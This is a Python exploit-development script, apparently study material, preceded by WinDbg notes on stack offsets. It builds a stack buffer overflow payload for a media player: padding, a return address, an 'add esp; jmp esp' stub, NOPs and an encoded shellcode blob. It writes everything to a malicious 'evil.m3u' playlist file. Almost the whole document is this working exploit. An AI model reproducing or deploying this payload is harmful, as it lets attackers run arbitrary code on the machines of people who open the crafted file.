"""
Imagine the there is only 10 bytes of space for your shellcode, but dumping esp using "d esp",
we observe that 24 bytes down we arrive at the start of our shellcode. Hence we need to jmp 24

Use pattern string to know that after the limit when we begin to see our payload, it indeed starts
from index 0 of our payload (e.g. Aa0A). Replace the first 8 characters of pattern string with CC
so that we will hit interrupt after we run the "add 18 to esp, then jmp esp" command.

0:022> a
77c52780 add esp, 0x18
add esp, 0x18
77c52783 jmp esp
jmp esp
77c52785 

0:022> u 77c52780 
ntdll!DbgBreakPoint:
77c52780 83c418          add     esp,18h
77c52783 ffe4            jmp     esp
77c52785 cc              int     3
77c52786 cc              int     3
77c52787 cc              int     3
77c52788 cc              int     3
77c52789 cc              int     3
77c5278a cc              int     3
"""

import struct

length_of_padding = 26088
push_esp_ret = "\x58\xb0\x01\x10"
skip_limit = "\x83\xc4\x18" + "\xff\xe4" # add esp, 18; jmp esp
inbetween_eip_esp = "\x44" * 4
simulate_limit = "\x90" * 10

nops = "\x90" * 25
shellcode =  ""
shellcode += "\xba\xfb\xd0\x1e\x15\xda\xc9\xd9\x74\x24\xf4\x5e"
shellcode += "\x33\xc9\xb1\x52\x83\xee\xfc\x31\x56\x0e\x03\xad"
shellcode += "\xde\xfc\xe0\xad\x37\x82\x0b\x4d\xc8\xe3\x82\xa8"
shellcode += "\xf9\x23\xf0\xb9\xaa\x93\x72\xef\x46\x5f\xd6\x1b"
shellcode += "\xdc\x2d\xff\x2c\x55\x9b\xd9\x03\x66\xb0\x1a\x02"
shellcode += "\xe4\xcb\x4e\xe4\xd5\x03\x83\xe5\x12\x79\x6e\xb7"
shellcode += "\xcb\xf5\xdd\x27\x7f\x43\xde\xcc\x33\x45\x66\x31"
shellcode += "\x83\x64\x47\xe4\x9f\x3e\x47\x07\x73\x4b\xce\x1f"
shellcode += "\x90\x76\x98\x94\x62\x0c\x1b\x7c\xbb\xed\xb0\x41"
shellcode += "\x73\x1c\xc8\x86\xb4\xff\xbf\xfe\xc6\x82\xc7\xc5"
shellcode += "\xb5\x58\x4d\xdd\x1e\x2a\xf5\x39\x9e\xff\x60\xca"
shellcode += "\xac\xb4\xe7\x94\xb0\x4b\x2b\xaf\xcd\xc0\xca\x7f"
shellcode += "\x44\x92\xe8\x5b\x0c\x40\x90\xfa\xe8\x27\xad\x1c"
shellcode += "\x53\x97\x0b\x57\x7e\xcc\x21\x3a\x17\x21\x08\xc4"
shellcode += "\xe7\x2d\x1b\xb7\xd5\xf2\xb7\x5f\x56\x7a\x1e\x98"
shellcode += "\x99\x51\xe6\x36\x64\x5a\x17\x1f\xa3\x0e\x47\x37"
shellcode += "\x02\x2f\x0c\xc7\xab\xfa\x83\x97\x03\x55\x64\x47"
shellcode += "\xe4\x05\x0c\x8d\xeb\x7a\x2c\xae\x21\x13\xc7\x55"
shellcode += "\xa2\xdc\xb0\x47\x3c\xb5\xc2\x67\x40\xc2\x4a\x81"
shellcode += "\x2a\xdc\x1a\x1a\xc3\x45\x07\xd0\x72\x89\x9d\x9d"
shellcode += "\xb5\x01\x12\x62\x7b\xe2\x5f\x70\xec\x02\x2a\x2a"
shellcode += "\xbb\x1d\x80\x42\x27\x8f\x4f\x92\x2e\xac\xc7\xc5"
shellcode += "\x67\x02\x1e\x83\x95\x3d\x88\xb1\x67\xdb\xf3\x71"
shellcode += "\xbc\x18\xfd\x78\x31\x24\xd9\x6a\x8f\xa5\x65\xde"
shellcode += "\x5f\xf0\x33\x88\x19\xaa\xf5\x62\xf0\x01\x5c\xe2"
shellcode += "\x85\x69\x5f\x74\x8a\xa7\x29\x98\x3b\x1e\x6c\xa7"
shellcode += "\xf4\xf6\x78\xd0\xe8\x66\x86\x0b\xa9\x97\xcd\x11"
shellcode += "\x98\x3f\x88\xc0\x98\x5d\x2b\x3f\xde\x5b\xa8\xb5"
shellcode += "\x9f\x9f\xb0\xbc\x9a\xe4\x76\x2d\xd7\x75\x13\x51"
shellcode += "\x44\x75\x36"
exploit_ACTUAL = nops + shellcode
padding = exploit_ACTUAL + "\xCC" * (length_of_padding - len(exploit_ACTUAL))

payload = padding + push_esp_ret + inbetween_eip_esp + skip_limit + simulate_limit

f = open("evil.m3u", "w")
f.write(payload)
f.close